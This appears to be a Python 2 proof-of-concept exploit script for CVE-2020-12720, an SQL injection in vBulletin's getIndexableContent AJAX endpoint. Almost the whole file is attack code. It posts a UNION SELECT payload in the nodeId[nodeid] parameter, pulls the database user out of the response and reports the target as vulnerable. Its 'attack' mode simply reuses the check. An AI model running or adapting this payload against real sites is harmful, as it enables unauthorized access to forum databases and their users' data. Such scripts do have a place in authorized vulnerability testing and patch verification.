#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2020/5/13
# refer:https://www.tenable.com/blog/cve-2020-12720-vbulletin-urges-users-to-patch-undisclosed-security-vulnerability
import requests
import binascii
import string
import random
import re

res = {}


def verify(target_node):
    target = target_node['target']
    url = target + '/ajax/api/content_infraction/getIndexableContent'
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'}
    try :
        sess = requests.session()
        sess.headers = headers
        _keyword = ''.join(random.sample(string.ascii_letters + string.digits, 8))

        payload = "1 AND text.nodeid = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,concat(0x3a3a,user(),0x3a3a,0x{0}),19,20,21,22,23,24,25,26--".format(binascii.b2a_hex(_keyword))
        data = {'nodeId[nodeid]':payload}
        response_text = sess.post(url,data=data).content
        match = re.compile('::(.*?)::').search(response_text)
        info =match.group(1)
        if _keyword in response_text:
                res['Info'] = 'FOUNDED VULNERABILTY!!!'+'|{0}'.format(info)
                res['Success'] = True
    except Exception,e:
        res['Info'] = e.message
        res['Success'] = False
    return res


def attack(target_node):
    res = verify(target_node)
    return res


def poc(target,mode):
    if mode == 'verify':
        res =verify(target)
    if mode == 'attack':
        res = attack(target)
    return res